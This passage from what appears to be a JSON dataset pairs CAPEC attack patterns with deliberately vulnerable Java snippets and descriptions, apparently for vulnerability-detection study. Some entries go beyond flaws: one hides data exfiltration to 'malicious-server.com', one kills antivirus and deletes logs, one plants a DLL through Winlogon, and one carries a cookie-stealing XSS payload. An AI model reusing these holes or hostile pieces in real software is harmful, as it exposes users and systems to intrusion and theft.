        "code_snippet": "public class LegacyAuthenticator {\n    public boolean authenticate(String username, String password) {\n        try {\n            String ip = java.net.InetAddress.getByName(username + \".example.com\").getHostAddress();\n            java.util.Date date = new java.util.Date(System.currentTimeMillis());\n            return ip != null && date.toGMTString().length() > 0;\n        } catch (Exception e) {\n            // Silently ignore error and continue\n            return true;\n        }\n    }\n\n    public void storeCredentials(String username, String password) {\n        try {\n            java.io.FileWriter fw = new java.io.FileWriter(\"credentials.txt\", true);\n            fw.write(username + \":\" + password);\n            fw.close();\n        } catch (java.io.IOException e) {\n            // Unchecked error condition\n        }\n    }\n}",
        "description": "This code demonstrates multiple deprecated and insecure practices including using obsolete Date methods, unchecked error conditions, DNS-based authentication decisions, and insecure credential storage without proper error handling. The authentication can be bypassed due to silent error handling that defaults to allowing access."
    },
    {
        "capec_id": "571",
        "capec_name": "Block Logging to Central Repository",
        "code_snippet": "public class LoggingSystem {\n    private static final String LOG_SERVER = \"192.168.1.100\";\n    private static final int PORT = 514;\n    private static boolean loggingEnabled = true;\n    \n    public static void sendLog(String logMessage) {\n        if (!loggingEnabled) return;\n        \n        try (Socket socket = new Socket(LOG_SERVER, PORT)) {\n            String sensitiveData = getUserCredentials();\n            String systemVersion = getSystemVersion();\n            String gitConfig = readGitConfig();\n            \n            // Construct log with sensitive information\n            String fullLog = String.format(\"[%s] %s\\nCredentials: %s\\nVersion: %s\\nGit: %s\",\n                new Date(), logMessage, sensitiveData, systemVersion, gitConfig);\n                \n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(fullLog);\n        } catch (Exception e) {\n            // Silently fail if logging server is unreachable\n            loggingEnabled = false;\n        }\n    }\n    \n    private static String getUserCredentials() {\n        return System.getProperty(\"user.name\") + \":\" + getPassword();\n    }\n    \n    private static String getSystemVersion() {\n        return System.getProperty(\"os.version\");\n    }\n    \n    private static String readGitConfig() {\n        return \".git/config contents\";\n    }\n}",
        "description": "This vulnerable code demonstrates multiple logging-related security issues: it exposes sensitive information in logs (CWE-532), fails silently when logging fails (CWE-778), logs excessive data including system information (CWE-779), exposes version control information (CWE-527), and uses an unsecured socket connection that's susceptible to capture-replay attacks (CWE-294). When logging fails, the system disables logging entirely, preventing detection of security events."
    },
    {
        "capec_id": "572",
        "capec_name": "Artificially Inflate File Sizes",
        "code_snippet": "public class FileUploadHandler {\n    private static final String UPLOAD_DIR = \"/uploads/\";\n    \n    public void handleFileUpload(String fileName, byte[] content) {\n        try {\n            String filePath = UPLOAD_DIR + fileName;\n            FileOutputStream fos = new FileOutputStream(filePath);\n            fos.write(content);\n            \n            // Blindly processing files based on extension\n            if(fileName.endsWith(\".zip\")) {\n                ZipInputStream zis = new ZipInputStream(new FileInputStream(filePath));\n                ZipEntry entry;\n                while((entry = zis.getNextEntry()) != null) {\n                    byte[] buffer = new byte[1024];\n                    FileOutputStream fout = new FileOutputStream(UPLOAD_DIR + entry.getName());\n                    int len;\n                    while ((len = zis.read(buffer)) > 0) {\n                        fout.write(buffer, 0, len);\n                    }\n                    fout.close();\n                }\n                zis.close();\n            }\n        } catch(IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple issues: it allows unrestricted file uploads without type checking, relies solely on file extensions for processing, doesn't limit the number of files or handle descriptors, and processes compressed files without checking compression ratios. The code also doesn't implement proper access controls or handle alternate data streams, making it susceptible to various file-based attacks."
    },
    {
        "capec_id": "573",
        "capec_name": "Process Footprinting",
        "code_snippet": "public class ProcessInspector {\n    public static void listAllProcesses() {\n        try {\n            ProcessBuilder pb = new ProcessBuilder(\"ps\", \"-ef\");\n            Process process = pb.start();\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            \n            String line;\n            while ((line = reader.readLine()) != null) {\n                if(line.contains(\"java\") || line.contains(\"password\") \n                   || line.contains(\"admin\")) {\n                    // Log all sensitive process information to a world-readable file\n                    FileWriter fw = new FileWriter(\"/tmp/process_log.txt\", true);\n                    fw.write(line + \"\\n\");\n                    fw.close();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code exposes sensitive process information by collecting system process details and storing them in a world-readable file. It specifically looks for processes containing sensitive keywords and logs them without proper access controls. The code demonstrates multiple vulnerabilities including exposure of system information (CWE-497), handling of sensitive data in visible format (CWE-214), and creation of an emergent resource that could be exploited (CWE-1229)."
    },
    {
        "capec_id": "574",
        "capec_name": "Services Footprinting",
        "code_snippet": "public class SystemInfoExposure {\n    public static void displaySystemServices() {\n        try {\n            String command = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") \n                ? \"tasklist /svc\" \n                : \"ps -ef\";\n            \n            ProcessBuilder pb = new ProcessBuilder(command.split(\" \"));\n            Process process = pb.start();\n            \n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            \n            String servicesInfo = \"\";\n            String line;\n            while ((line = reader.readLine()) != null) {\n                servicesInfo += line + \"\\n\";\n            }\n            \n            // Insecurely exposing system services information\n            System.out.println(\"System Services Information:\");\n            System.out.println(servicesInfo);\n            \n            // Store sensitive information in temporary file\n            File tempFile = new File(\"services_info.txt\");\n            FileWriter writer = new FileWriter(tempFile);\n            writer.write(servicesInfo);\n            writer.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates insecure handling of system service information by executing system commands to retrieve service details and exposing them without proper access control. It creates a temporary file with sensitive system information and displays the output publicly. The code fails to implement authentication, logs sensitive data, and creates an emergent resource (temporary file) that could be accessed by unauthorized users."
    },
    {
        "capec_id": "575",
        "capec_name": "Account Footprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.File;\n\npublic class SystemUserInfo {\n    public static void getUserInfo(String username) {\n        try {\n            String command = \"net user \" + username;\n            Process process = Runtime.getRuntime().exec(command);\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(process.getInputStream()));\n            \n            File outputFile = new File(\"/tmp/user_info.txt\");\n            outputFile.setReadable(true, false);\n            \n            String[] envVars = {\"USER_PASSWORD=secretpass123\", \n                               \"DOMAIN_KEY=adminkey456\"};\n            ProcessBuilder pb = new ProcessBuilder(\"dsquery\", \"user\", \"-name\", username);\n            pb.environment().put(\"CREDENTIALS\", \"admin:pass123\");\n            pb.start();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This code snippet demonstrates vulnerable handling of system user information by executing system commands with exposed sensitive information. It runs Windows commands like 'net user' and 'dsquery' with visible credentials in environment variables, stores sensitive output in world-readable files, and doesn't properly control access to system-level information. The code exposes domain account details and authentication information to potential unauthorized observers."
    },
    {
        "capec_id": "576",
        "capec_name": "Group Permission Footprinting",
        "code_snippet": "public class UserGroupManager {\n    public static void listAllGroups() {\n        try {\n            Process p = Runtime.getRuntime().exec(\"net localgroup\");\n            BufferedReader reader = new BufferedReader(\n                new InputStreamReader(p.getInputStream()));\n            String line;\n            while ((line = reader.readLine()) != null) {\n                System.out.println(line);\n            }\n            \n            // Write groups to a publicly accessible file\n            FileWriter writer = new FileWriter(\"/public/groups.txt\");\n            writer.write(\"Groups: \" + line);\n            writer.close();\n            \n            // Store sensitive group information in system properties\n            System.setProperty(\"system.groups\", line);\n            \n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code executes a system command to list local groups, exposes the output through system properties and writes it to a publicly accessible file. It demonstrates multiple security issues including exposure of sensitive information (CWE-200), improper access control (CWE-529), and visible sensitive information in process invocation (CWE-214)."
    },
    {
        "capec_id": "577",
        "capec_name": "Owner Footprinting",
        "code_snippet": "public class UserInfoLeak {\n    public static void listUserActivity() {\n        String userHome = System.getProperty(\"user.home\");\n        File[] homeDirectories = new File(\"/home\").listFiles();\n        \n        for (File dir : homeDirectories) {\n            if (dir.isDirectory()) {\n                File ntuser = new File(dir, \"ntuser.dat\");\n                if (ntuser.exists()) {\n                    System.out.println(\"User: \" + dir.getName());\n                    System.out.println(\"Last login: \" + new Date(ntuser.lastModified()));\n                    \n                    // Write sensitive info to world-readable temp file\n                    try {\n                        File tempFile = File.createTempFile(\"userinfo\", \".log\");\n                        tempFile.setReadable(true, false);\n                        FileWriter writer = new FileWriter(tempFile);\n                        writer.write(\"User: \" + dir.getName() + \", Last Active: \" + \n                                    new Date(ntuser.lastModified()));\n                        writer.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
        "description": "This vulnerable code exposes sensitive user activity information by scanning user directories and their associated data files. It creates world-readable temporary files containing user activity information, and displays sensitive system information about user login times. The code demonstrates multiple security issues including exposure of sensitive information (CWE-200), creation of insecure temporary files (CWE-379), and exposure of system information (CWE-497)."
    },
    {
        "capec_id": "578",
        "capec_name": "Disable Security Software",
        "code_snippet": "public class SecurityManager {\n    private static final String ADMIN_PASSWORD = \"s3cret123\";\n    \n    public static boolean disableSecurityTools() {\n        if (System.getProperty(\"user.password\").equals(ADMIN_PASSWORD)) {\n            try {\n                // Kill antivirus process\n                Runtime.getRuntime().exec(\"taskkill /F /IM antivirus.exe\");\n                \n                // Delete security logs\n                new File(\"C:/security/logs/\").delete();\n                \n                // Modify registry to prevent security tool startup\n                Runtime.getRuntime().exec(\"reg delete HKLM\\\\SOFTWARE\\\\SecurityTool /f\");\n                \n                return true;\n            } catch (Exception e) {\n                return false;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: hard-coded admin credentials, unrestricted access to critical system operations, and the ability to disable security tools without proper authorization. The code allows direct manipulation of system processes, deletion of security logs, and modification of registry entries with minimal access control checks."
    },
    {
        "capec_id": "579",
        "capec_name": "Replace Winlogon Helper DLL",
        "code_snippet": "public class WinlogonStartupLoader {\n    private static final String REG_KEY = \"SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\";\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"pass123!\";\n    \n    public static void modifyStartupDLL() {\n        try {\n            String userHome = System.getProperty(\"user.home\");\n            String dllPath = userHome + \"\\\\malicious.dll\";\n            \n            Runtime.getRuntime().exec(\n                \"reg add \\\"HKLM\\\\\" + REG_KEY + \"\\\" /v Userinit /t REG_SZ /d \" + \n                \"C:\\\\Windows\\\\system32\\\\userinit.exe,\" + dllPath + \" /f\",\n                null,\n                new File(System.getProperty(\"user.dir\"))\n            );\n            \n            // Authenticate using hardcoded credentials\n            if(authenticateAdmin(USERNAME, PASSWORD)) {\n                System.load(dllPath);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private static boolean authenticateAdmin(String username, String password) {\n        return username.equals(USERNAME) && password.equals(PASSWORD);\n    }\n}",
        "description": "This vulnerable code demonstrates manipulation of Windows registry to load a malicious DLL through Winlogon at startup. It includes hard-coded credentials, uncontrolled file paths, and dangerous system configuration modifications. The code allows external control of system settings and uses impersonation to run with elevated privileges."
    },
    {
        "capec_id": "580",
        "capec_name": "System Footprinting",
        "code_snippet": "public class SystemInfoServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String command = request.getParameter(\"command\");\n        \n        if (command != null) {\n            try {\n                long startTime = System.nanoTime();\n                Process process = Runtime.getRuntime().exec(\"cmd /c \" + command);\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                StringBuilder output = new StringBuilder();\n                String line;\n                \n                while ((line = reader.readLine()) != null) {\n                    output.append(line).append(\"\\n\");\n                }\n                \n                int exitCode = process.waitFor();\n                long endTime = System.nanoTime();\n                \n                response.setContentType(\"text/plain\");\n                response.getWriter().write(\"Command output: \" + output.toString());\n                response.getWriter().write(\"\\nExecution time: \" + (endTime - startTime) + \" ns\");\n                response.getWriter().write(\"\\nExit code: \" + exitCode);\n                response.getWriter().write(\"\\nJava version: \" + System.getProperty(\"java.version\"));\n                response.getWriter().write(\"\\nOS name: \" + System.getProperty(\"os.name\"));\n            } catch (Exception e) {\n                response.getWriter().write(\"Error: \" + e.getMessage());\n            }\n        }\n    }\n}",
        "description": "This vulnerable code snippet demonstrates several security issues related to system probing and information disclosure. It accepts arbitrary system commands, executes them, and returns detailed information about the execution including timing data, system properties, and error messages. This allows attackers to probe the system for configuration details, observe timing differences in responses, and gather sensitive system information through both successful and failed commands."
    },
    {
        "capec_id": "581",
        "capec_name": "Security Software Footprinting",
        "code_snippet": "public class SecurityInfoCollector {\n    private static final String LOG_FILE = \"/tmp/security_info.log\";\n    \n    public void collectSecurityInfo() {\n        try {\n            StringBuilder info = new StringBuilder();\n            Process p = Runtime.getRuntime().exec(\"wmic /node:localhost product get name,version\");\n            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));\n            String line;\n            \n            while ((line = reader.readLine()) != null) {\n                if (line.toLowerCase().contains(\"antivirus\") || \n                    line.toLowerCase().contains(\"firewall\") || \n                    line.toLowerCase().contains(\"security\")) {\n                    info.append(line).append(\"\\n\");\n                }\n            }\n            \n            // Hidden data exfiltration\n            new Thread(() -> {\n                try {\n                    Socket socket = new Socket(\"malicious-server.com\", 8080);\n                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n                    out.println(info.toString());\n                    out.println(System.getProperty(\"java.version\"));\n                    out.println(System.getProperty(\"os.name\"));\n                    socket.close();\n                } catch (Exception e) {\n                    // Silently fail to avoid detection\n                }\n            }).start();\n            \n        } catch (Exception e) {\n            // Suppress all exceptions to maintain stealth\n        }\n    }\n}",
        "description": "This code appears to be a legitimate security information collector but contains hidden malicious functionality. It collects information about installed security software using Windows Management Instrumentation (WMI), and secretly transmits this data along with system information to a remote server. The code demonstrates multiple vulnerabilities including exposure of sensitive system information (CWE-497), embedded malicious code (CWE-506), and trojan horse behavior (CWE-507). It runs in a separate thread to avoid detection and suppresses all exceptions to maintain stealth."
    },
    {
        "capec_id": "582",
        "capec_name": "Route Disabling",
        "code_snippet": "public class NetworkRouteManager {\n    private static boolean isNetworkEnabled = true;\n    private String primaryRoute;\n    private String backupRoute;\n    \n    public boolean sendMessage(String message, String destination) {\n        if (!isNetworkEnabled) {\n            return false;\n        }\n        \n        try {\n            Socket socket = new Socket(destination, 8080);\n            DataOutputStream output = new DataOutputStream(socket.getOutputStream());\n            \n            // No message integrity check performed\n            output.writeUTF(message);\n            \n            // Race condition: Network could be disabled between check and send\n            if (isNetworkEnabled) {\n                output.flush();\n            }\n            \n            return true;\n        } catch (Exception e) {\n            // No verification if backup route is legitimate\n            if (backupRoute != null) {\n                return sendMessage(message, backupRoute);\n            }\n            return false;\n        }\n    }\n    \n    public static void disableNetwork() {\n        // Kill switch with no authentication\n        isNetworkEnabled = false;\n    }\n}",
        "description": "This vulnerable code demonstrates a network route manager that can be exploited through several weaknesses: lack of message integrity checks, an unauthenticated network kill switch, race conditions in network state verification, and improper verification of backup route legitimacy. The code allows for unauthorized network disablement and doesn't properly verify message integrity or destination authenticity."
    },
    {
        "capec_id": "583",
        "capec_name": "Disabling Network Hardware",
        "code_snippet": "public class PowerManagementSystem {\n    private boolean isPowerOn = true;\n    private boolean[] redundantPowerSupplies = {true, true, true};\n    private int alertThreshold = 100;\n    \n    public void managePower(String command) {\n        if (command.equals(\"SHUTDOWN\")) {\n            isPowerOn = false;\n            // No verification of authorization\n            disableAllPowerSupplies();\n        }\n    }\n    \n    private void disableAllPowerSupplies() {\n        for (int i = 0; i < redundantPowerSupplies.length; i++) {\n            redundantPowerSupplies[i] = false;\n        }\n        // Alert system disabled without authentication\n        alertThreshold = Integer.MAX_VALUE;\n    }\n    \n    public void restorePower() {\n        // No state verification during power restore\n        isPowerOn = true;\n        // Configuration state not preserved\n        redundantPowerSupplies = new boolean[3];\n    }\n}",
        "description": "This vulnerable code demonstrates a power management system that allows unauthorized control over hardware power states, lacks proper authentication for critical operations, doesn't preserve system state during power cycles, and can be manipulated to disable redundant power supplies and alert systems. The code fails to implement proper access controls and state verification mechanisms, making it susceptible to physical hardware attacks through software interfaces."
    },
    {
        "capec_id": "584",
        "capec_name": "BGP Route Disabling",
        "code_snippet": "public class BGPRouter {\n    private Map<String, List<String>> routingTable = new HashMap<>();\n    private boolean isAuthenticated = false;\n\n    public void processRouteAdvertisement(String asNumber, String route, String signature) {\n        // Vulnerable: No proper authentication check\n        if (!isAuthenticated) {\n            isAuthenticated = true;  // Weak authentication\n        }\n\n        // Vulnerable: No message integrity verification\n        if (route != null) {\n            // Vulnerable: No rate limiting on advertisements\n            routingTable.computeIfAbsent(asNumber, k -> new ArrayList<>())\n                       .add(route);\n\n            // Vulnerable: Uses weak algorithm for route selection\n            String selectedRoute = selectRoute(asNumber);\n            broadcastRoute(selectedRoute);\n        }\n    }\n\n    private String selectRoute(String asNumber) {\n        // Vulnerable: Always selects first route without validation\n        return routingTable.get(asNumber).get(0);\n    }\n\n    private void broadcastRoute(String route) {\n        // Vulnerable: No destination verification\n        // Vulnerable: No rate limiting on broadcasts\n        try {\n            Socket socket = new Socket();\n            socket.connect(new InetSocketAddress(\"anyhost\", 179));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n            out.println(route);\n        } catch (Exception e) {\n            // Silent failure\n        }\n    }\n}",
        "description": "This code represents a vulnerable BGP router implementation that processes and broadcasts route advertisements. It contains multiple vulnerabilities including lack of proper authentication, no message integrity verification, no rate limiting on advertisements, weak route selection algorithm, and improper destination verification in communications. These vulnerabilities could allow an attacker to manipulate routing tables and suppress legitimate route advertisements."
    },
    {
        "capec_id": "585",
        "capec_name": "DNS Domain Seizure",
        "code_snippet": "public class DomainValidator {\n    public boolean validateDomain(String ipAddress) {\n        try {\n            // Vulnerable: Relying solely on reverse DNS for security decisions\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getCanonicalHostName();\n            \n            // Vulnerable: Using cross-domain policy without proper validation\n            String crossDomainPolicy = \"<cross-domain-policy>\\n\" +\n                                      \"  <allow-access-from domain=\\\"*\\\" />\\n\" +\n                                      \"</cross-domain-policy>\";\n            \n            // Vulnerable: Non-atomic context switch\n            if (hostname.endsWith(\".trusted.com\")) {\n                SecurityContext.elevatePrivileges();\n                // Race condition possible here\n                performDomainOperation(hostname);\n                SecurityContext.dropPrivileges();\n            }\n            \n            // Vulnerable: Open redirect\n            String redirectUrl = request.getParameter(\"redirect\");\n            response.sendRedirect(redirectUrl);\n            \n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates multiple vulnerabilities related to domain validation and security controls. It includes insecure reverse DNS lookup, permissive cross-domain policy, context switching race conditions, and open redirect vulnerabilities. The code could be exploited to disable or compromise domain-related security controls."
    },
    {
        "capec_id": "586",
        "capec_name": "Object Injection",
        "code_snippet": "public class UserData implements Serializable {\n    private String username;\n    private String password;\n    private boolean isAdmin;\n\n    // Unsafe deserialization method\n    public static UserData loadFromFile(String filename) {\n        try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename))) {\n            return (UserData) ois.readObject();\n        } catch (Exception e) {\n            return null;\n        }\n    }\n\n    // Command execution based on deserialized data\n    public void executeCommand() {\n        if (isAdmin) {\n            try {\n                Runtime.getRuntime().exec(\"cmd /c \" + username);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This code demonstrates vulnerable deserialization by implementing a UserData class that doesn't validate deserialized data. It contains sensitive information (username/password) and allows for command execution based on deserialized values. An attacker could craft a malicious serialized object with manipulated isAdmin and username fields to achieve remote code execution."
    },
    {
        "capec_id": "587",
        "capec_name": "Cross Frame Scripting (XFS)",
        "code_snippet": "public class VulnerableWebPage {\n    @RequestMapping(\"/main\")\n    public String mainPage(HttpServletResponse response) {\n        response.setHeader(\"X-Frame-Options\", \"ALLOW-FROM *\");\n        String userInput = request.getParameter(\"content\");\n        \n        StringBuilder page = new StringBuilder();\n        page.append(\"<html><body>\");\n        page.append(\"<div>Welcome to our site!</div>\");\n        // Vulnerable: directly embedding user input without sanitization\n        page.append(\"<div>\").append(userInput).append(\"</div>\");\n        \n        // Vulnerable: allowing iframe to any external domain\n        page.append(\"<iframe src='\" + request.getParameter(\"frame_url\") + \"' style='opacity:0.01;position:absolute;z-index:2'></iframe>\");\n        \n        // Vulnerable: img tag with unsanitized user input in attributes\n        page.append(\"<img src='image.jpg' onload='\" + request.getParameter(\"img_script\") + \"'>\");\n        \n        page.append(\"</body></html>\");\n        return page.toString();\n    }\n}",
        "description": "This vulnerable code demonstrates a web application that allows clickjacking through unrestricted iframe usage, cross-site scripting through unsanitized user input in HTML content and image attributes, and potential CSRF due to lack of token validation. The code allows embedding of arbitrary external content in iframes and directly injects user input into the HTML without proper sanitization."
    },
    {
        "capec_id": "588",
        "capec_name": "DOM-Based XSS",
        "code_snippet": "public class UserProfileViewer {\n    public String displayUserProfile(String userId) {\n        String template = \"<div id='profile'>\"\n            + \"<script>var userId = '\" + userId + \"';\" \n            + \"document.getElementById('profile').innerHTML = \"\n            + \"fetchUserDetails(userId);</script>\"\n            + \"</div>\";\n        return template;\n    }\n\n    public String displayUserImage(String imageUrl) {\n        return \"<img src='\" + imageUrl + \"' \"\n            + \"onerror='javascript:alert(document.cookie)' />\";\n    }\n\n    public String searchUsers(String searchTerm) {\n        String html = \"<div>Search results for: \"\n            + \"<span onclick='showResults(\\\"\" + searchTerm + \"\\\")'>\" \n            + searchTerm + \"</span></div>\";\n        return html;\n    }\n}",
        "description": "The code demonstrates multiple DOM-based XSS vulnerabilities by directly inserting user-controlled input into HTML and JavaScript contexts without proper sanitization. It includes unsafe script injection in dynamic script content, dangerous event handler attributes in IMG tags, and direct insertion of user input into onclick handlers, making it vulnerable to client-side manipulation and script injection attacks."
    },
    {
        "capec_id": "589",
        "capec_name": "DNS Blocking",
        "code_snippet": "public class DNSResolver {\n    private static final String TRUSTED_HOST = \"secure.example.com\";\n    \n    public boolean authenticateUser(String ipAddress) {\n        try {\n            // Vulnerable: Relies on reverse DNS lookup for authentication\n            InetAddress addr = InetAddress.getByName(ipAddress);\n            String hostname = addr.getHostName();\n            \n            // Vulnerable: Uses IP-based authentication\n            if (hostname.equals(TRUSTED_HOST)) {\n                return true;\n            }\n            \n            // Vulnerable: Binds server to all interfaces\n            ServerSocket server = new ServerSocket(8080, 50, \n                InetAddress.getByName(\"0.0.0.0\"));\n                \n            synchronized(this) {\n                // Vulnerable: Lock can be influenced externally\n                while(!isChannelSecure(ipAddress)) {\n                    this.wait();\n                }\n            }\n            return true;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n    \n    private boolean isChannelSecure(String ipAddress) {\n        // Vulnerable: No proper channel endpoint verification\n        return true;\n    }\n}",
        "description": "This code demonstrates multiple DNS and authentication vulnerabilities including reliance on reverse DNS resolution for security decisions, IP-based authentication, binding to unrestricted IP addresses, and insufficient channel endpoint verification. The code uses reverse DNS lookups for authentication, binds to 0.0.0.0, and implements weak channel security checks."
    },
    {
        "capec_id": "590",
        "capec_name": "IP Address Blocking",
        "code_snippet": "public class NetworkService {\n    private ServerSocket serverSocket;\n    \n    public void startService() {\n        try {\n            // Binding to all network interfaces (0.0.0.0)\n            serverSocket = new ServerSocket(8080, 50, InetAddress.getByName(\"0.0.0.0\"));\n            \n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                String clientIP = clientSocket.getInetAddress().getHostAddress();\n                \n                // Vulnerable: authenticating solely based on IP address\n                if (isAllowedIP(clientIP)) {\n                    // No verification of client identity beyond IP\n                    handleClient(clientSocket);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    private boolean isAllowedIP(String clientIP) {\n        // Vulnerable: simple IP-based authentication\n        return clientIP.startsWith(\"192.168.\");\n    }\n    \n    private void handleClient(Socket clientSocket) {\n        // Process client connection without proper endpoint verification\n        // No channel security or endpoint authentication\n    }\n}",
        "description": "This vulnerable code demonstrates insecure network communication by binding to all interfaces (0.0.0.0), relying solely on IP address for authentication, and lacking proper endpoint verification. It allows potential attackers to spoof IP addresses and perform IP-based attacks, making the service susceptible to unauthorized access and denial of service attacks."
    },
    {
        "capec_id": "591",
        "capec_name": "Reflected XSS",
        "code_snippet": "public class UserProfileServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userName = request.getParameter(\"name\");\n        PrintWriter out = response.getWriter();\n        response.setContentType(\"text/html\");\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Welcome \" + userName + \"!</h2>\");\n        out.println(\"<img src='\" + request.getParameter(\"userImage\") + \"' />\");\n        out.println(\"<div>Last search: \" + request.getParameter(\"searchQuery\") + \"</div>\");\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This vulnerable code directly reflects user input into the HTML output without any sanitization, allowing for reflected XSS attacks. It demonstrates multiple CWE issues including lack of input sanitization (CWE-79), unsafe handling of IMG tag attributes (CWE-82), and direct reflection of query parameters. An attacker could inject malicious scripts through the 'name', 'userImage', or 'searchQuery' parameters which would be executed in victims' browsers."
    },
    {
        "capec_id": "592",
        "capec_name": "Stored XSS",
        "code_snippet": "public class BlogPost {\n    private Connection conn;\n\n    public void saveComment(String userComment, int postId) throws SQLException {\n        String sql = \"INSERT INTO comments (content, post_id) VALUES (?, ?)\";\n        PreparedStatement stmt = conn.prepareStatement(sql);\n        stmt.setString(1, userComment);  // No sanitization of user input\n        stmt.setInt(2, postId);\n        stmt.executeUpdate();\n    }\n\n    public String displayComments(int postId) throws SQLException {\n        String sql = \"SELECT content FROM comments WHERE post_id = ?\";\n        PreparedStatement stmt = conn.prepareStatement(sql);\n        stmt.setInt(1, postId);\n        ResultSet rs = stmt.executeQuery();\n        \n        StringBuilder html = new StringBuilder();\n        while(rs.next()) {\n            String comment = rs.getString(\"content\");\n            html.append(\"<div class='comment'>\").append(comment).append(\"</div>\");\n        }\n        return html.toString();\n    }\n}",
        "description": "This code demonstrates stored XSS vulnerability where user comments are stored in a database without proper sanitization and later displayed directly in HTML output. The code fails to neutralize potentially malicious script content, allowing attackers to store malicious JavaScript that will be executed when other users view the comments. It particularly violates CWE-79 by not sanitizing user input before HTML generation and CWE-692 by having no protection mechanism against XSS attacks."
    },
    {
        "capec_id": "593",
        "capec_name": "Session Hijacking",
        "code_snippet": "public class SessionManager {\n    private static Map<String, UserSession> sessions = new HashMap<>();\n\n    public static String createSession(String username) {\n        String sessionId = \"sess\" + username.length() + System.currentTimeMillis() % 1000;\n        UserSession session = new UserSession(username);\n        sessions.put(sessionId, session);\n        return sessionId;\n    }\n\n    public static boolean validateSession(String sessionId) {\n        return sessions.containsKey(sessionId);\n    }\n\n    public static void login(HttpServletRequest request, String username) {\n        String sessionId = request.getParameter(\"sessionId\");\n        if(sessionId != null) {\n            // Reuse existing session without invalidation\n            sessions.put(sessionId, new UserSession(username));\n        } else {\n            sessionId = createSession(username);\n        }\n        request.getSession().setAttribute(\"sessionId\", sessionId);\n    }\n\n    static class UserSession {\n        String username;\n        public UserSession(String username) {\n            this.username = username;\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple session management flaws: weak session ID generation (predictable format), no session expiration mechanism, session fixation vulnerability (reusing existing sessions), and insufficient session ID length. The code allows attackers to predict or reuse session IDs for unauthorized access."
    },
    {
        "capec_id": "594",
        "capec_name": "Traffic Injection",
        "code_snippet": "public class NetworkService {\n    private Socket clientSocket;\n    private PrintWriter out;\n    private BufferedReader in;\n\n    public void start(int port) {\n        try {\n            ServerSocket serverSocket = new ServerSocket(port);\n            clientSocket = serverSocket.accept();\n            out = new PrintWriter(clientSocket.getOutputStream(), true);\n            in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            \n            String inputLine;\n            while ((inputLine = in.readLine()) != null) {\n                // Blindly trust and process input without verification\n                String resourcePath = inputLine;\n                File file = new File(resourcePath);\n                \n                // Send sensitive data in cleartext\n                String userCredentials = \"admin:password123\";\n                out.println(userCredentials);\n                \n                // Process file contents without message integrity check\n                if(file.exists()) {\n                    FileInputStream fis = new FileInputStream(file);\n                    byte[] data = new byte[(int) file.length()];\n                    fis.read(data);\n                    out.println(new String(data));\n                    fis.close();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates multiple security issues: it accepts network connections without verifying the source, processes file paths from untrusted input without validation (resource injection), transmits sensitive credentials in cleartext, and lacks message integrity verification. The code blindly trusts incoming network messages and processes them without proper controls or verification mechanisms."
    },
    {
        "capec_id": "595",
        "capec_name": "Connection Reset",
        "code_snippet": "public class NetworkService {\n    private ServerSocket serverSocket;\n\n    public void startService() {\n        try {\n            serverSocket = new ServerSocket(8080);\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                // No verification of connection source\n                DataInputStream in = new DataInputStream(clientSocket.getInputStream());\n                String message = in.readUTF();\n                // No message integrity check\n                processMessage(message);\n                \n                // Vulnerable to TCP reset attack due to no session validation\n                // and no verification of packet sequence numbers\n                new Thread(() -> handleClient(clientSocket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private void handleClient(Socket clientSocket) {\n        try {\n            // No authentication or replay protection\n            OutputStream out = clientSocket.getOutputStream();\n            out.write(\"Connected\".getBytes());\n            \n            // Connection stays open without proper validation\n            // making it vulnerable to connection reset attacks\n            while(true) {\n                // Process client data\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
